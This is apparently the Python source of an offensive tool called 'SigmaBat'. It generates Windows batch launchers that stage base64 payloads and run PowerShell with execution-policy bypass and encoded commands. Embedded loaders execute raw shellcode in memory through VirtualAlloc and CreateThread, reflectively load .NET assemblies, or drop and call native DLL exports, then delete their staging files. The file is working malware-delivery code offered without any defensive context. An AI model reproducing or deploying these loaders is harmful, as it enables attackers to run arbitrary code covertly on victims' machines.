import base64


CHUNK_SIZE = 3000

SHELLCODE_LOADER = r"""
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$b64 = $env:SIGMABAT_SHELLCODE_B64

if ([string]::IsNullOrWhiteSpace($b64)) {
    throw 'SIGMABAT_SHELLCODE_B64 is empty.'
}

$bytes = [Convert]::FromBase64String($b64)

[Console]::WriteLine("[SigmaBat] shellcode bytes loaded: {0}", $bytes.Length)

Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

$size = [UIntPtr]::new([uint64]$bytes.Length)
$mem = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
if ($mem -eq [IntPtr]::Zero) {
    throw 'VirtualAlloc failed.'
}

[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $mem, $bytes.Length)

$threadId = 0
$thread = [NativeMethods]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $mem, [IntPtr]::Zero, 0, [ref]$threadId)
if ($thread -eq [IntPtr]::Zero) {
    throw 'CreateThread failed.'
}

[void][NativeMethods]::WaitForSingleObject($thread, 4294967295)
[void][NativeMethods]::CloseHandle($thread)

[Console]::WriteLine("[SigmaBat] shellcode execution completed.")
"""

POWERSHELL_LOADER = r"""
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$b64 = $env:SIGMABAT_B64
$symbol = $env:SIGMABAT_SYMBOL
$mode = $env:SIGMABAT_MODE
$b64Path = $null

if ([string]::IsNullOrWhiteSpace($b64)) {
    $b64Path = $env:SIGMABAT_B64_PATH
    if ([string]::IsNullOrWhiteSpace($b64Path)) {
        throw 'SIGMABAT_B64 and SIGMABAT_B64_PATH are empty.'
    }

    $b64 = [regex]::Replace([System.IO.File]::ReadAllText($b64Path), '\s', '')
}

$dllPath = $null
$bytes = [Convert]::FromBase64String($b64)

if ($mode -ne 'managed_exe' -and [string]::IsNullOrWhiteSpace($symbol)) {
    throw 'SIGMABAT_SYMBOL is empty.'
}

$bindingFlags = [System.Reflection.BindingFlags]'Public,NonPublic,Static'

function Invoke-ManagedFunction {
    param(
        [System.Reflection.Assembly]$Assembly,
        [string]$Name
    )

    $candidates = foreach ($type in $Assembly.GetTypes()) {
        $type.GetMethods($bindingFlags) | Where-Object { $_.Name -eq $Name }
    }

    if (-not $candidates) {
        throw "Managed function '$Name' was not found."
    }

    $method = $candidates | Where-Object { $_.GetParameters().Count -eq 0 } | Select-Object -First 1
    if (-not $method) {
        $method = $candidates | Where-Object {
            $params = $_.GetParameters()
            $params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]
        } | Select-Object -First 1
    }

    if (-not $method) {
        throw "Managed function '$Name' exists, but its signature is not supported."
    }

    if ($method.GetParameters().Count -eq 0) {
        [void]$method.Invoke($null, @())
    }
    else {
        [void]$method.Invoke($null, (,([string[]]@())))
    }
}

function Invoke-ManagedEntryPoint {
    param(
        [System.Reflection.Assembly]$Assembly
    )

    $entryPoint = $Assembly.EntryPoint
    if (-not $entryPoint) {
        throw 'Managed assembly has no entry point.'
    }

    $params = $entryPoint.GetParameters()
    if ($params.Count -eq 0) {
        [void]$entryPoint.Invoke($null, @())
        return
    }

    if ($params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]) {
        [void]$entryPoint.Invoke($null, (,([string[]]@())))
        return
    }

    throw 'Managed entry point signature is not supported.'
}

function Invoke-NativeFunction {
    param(
        [byte[]]$Bytes,
        [string]$Name
    )

    $tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetRandomFileName() + '.dll')
    [System.IO.File]::WriteAllBytes($tempFile, $Bytes)
    $dllPath = $tempFile

    Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32", SetLastError=true)]
    public static extern bool FreeLibrary(IntPtr hModule);
}

[UnmanagedFunctionPointer(CallingConvention.Winapi)]
public delegate IntPtr NativeNoArgsDelegate();
"@

    try {
        $module = [NativeMethods]::LoadLibrary($dllPath)
        if ($module -eq [IntPtr]::Zero) {
            throw "Failed to load native DLL."
        }

        $proc = [NativeMethods]::GetProcAddress($module, $Name)
        if ($proc -eq [IntPtr]::Zero) {
            throw "Native export '$Name' was not found."
        }

        $fn = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            $proc,
            [NativeNoArgsDelegate]
        )
        [void]$fn.Invoke()
    }
    finally {
        if ($dllPath -and [System.IO.File]::Exists($dllPath)) {
            Remove-Item -LiteralPath $dllPath -Force -ErrorAction SilentlyContinue
        }
    }
}

switch ($mode) {
    'managed' {
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        Invoke-ManagedFunction -Assembly $assembly -Name $symbol
    }
    'managed_exe' {
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        Invoke-ManagedEntryPoint -Assembly $assembly
    }
    'native' {
        Invoke-NativeFunction -Bytes $bytes -Name $symbol
    }
    default {
        throw "Unknown DLL mode: $mode"
    }
}

if ($b64Path -and [System.IO.File]::Exists($b64Path)) {
    Remove-Item -LiteralPath $b64Path -Force -ErrorAction SilentlyContinue
}
"""


def chunk_string(value, size):
    for offset in range(0, len(value), size):
        yield value[offset:offset + size]


def encode_powershell_script(script_text):
    return base64.b64encode(script_text.encode("utf-16le")).decode("ascii")


def escape_batch_value(value):
    escaped = value.replace("^", "^^")
    escaped = escaped.replace("&", "^&")
    escaped = escaped.replace("|", "^|")
    escaped = escaped.replace("<", "^<")
    escaped = escaped.replace(">", "^>")
    escaped = escaped.replace("!", "^!")
    escaped = escaped.replace("%", "%%")
    return escaped


def build_dll_batch_launcher(payload_b64, symbol_name, mode):
    powershell_b64 = encode_powershell_script(POWERSHELL_LOADER.strip())
    use_env_staging = len(payload_b64) <= 6000
    lines = [
        "@echo off",
        "setlocal EnableExtensions DisableDelayedExpansion",
        f"set \"SIGMABAT_SYMBOL={escape_batch_value(symbol_name)}\"",
        f"set \"SIGMABAT_MODE={escape_batch_value(mode)}\"",
    ]

    if use_env_staging:
        lines.append("set \"SIGMABAT_B64=\"")
        for chunk in chunk_string(payload_b64, CHUNK_SIZE):
            lines.append(f'set "SIGMABAT_B64=%SIGMABAT_B64%{chunk}"')
    else:
        batch_file_name = "sigmabat_%RANDOM%%RANDOM%.b64"
        lines.append("set \"SIGMABAT_B64_PATH=%temp%\\" + batch_file_name + "\"")
        lines.append('type nul > "%SIGMABAT_B64_PATH%"')
        for chunk in chunk_string(payload_b64, CHUNK_SIZE):
            lines.append(f'>>"%SIGMABAT_B64_PATH%" echo {chunk}')

    lines.extend([
        f"powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {powershell_b64}",
        "if errorlevel 1 exit /b %errorlevel%",
        "endlocal",
        "",
    ])

    return "\r\n".join(lines)


def build_managed_exe_batch_launcher(payload_b64):
    return build_dll_batch_launcher(payload_b64, "", "managed_exe")


def build_shellcode_batch_launcher(payload_b64):
    powershell_b64 = encode_powershell_script(SHELLCODE_LOADER.strip())
    lines = [
        "@echo off",
        "setlocal EnableExtensions DisableDelayedExpansion",
        "set \"SIGMABAT_SHELLCODE_B64=\"",
        "echo [SigmaBat] shellcode launcher starting...",
    ]

    for chunk in chunk_string(payload_b64, CHUNK_SIZE):
        lines.append(f'set "SIGMABAT_SHELLCODE_B64=%SIGMABAT_SHELLCODE_B64%{chunk}"')

    lines.extend([
        f"powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {powershell_b64}",
        "if errorlevel 1 exit /b %errorlevel%",
        "echo [SigmaBat] shellcode launcher finished.",
        "endlocal",
        "",
    ])

    return "\r\n".join(lines)
